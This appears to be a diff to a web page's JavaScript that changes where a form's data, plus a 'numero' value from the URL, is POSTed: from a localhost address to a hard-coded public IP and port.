@@ -28,7 +28,7 @@
         e.preventDefault();
         let form_data = new FormData(forma,entregar)
         form_data.append("numero",window.location.search.substring(1).split('=')[1])
-        fetch('http://127.0.0.1:8080', {
+        fetch('http://181.26.65.187:28129', {
             method: "POST",
             body: form_data
         });
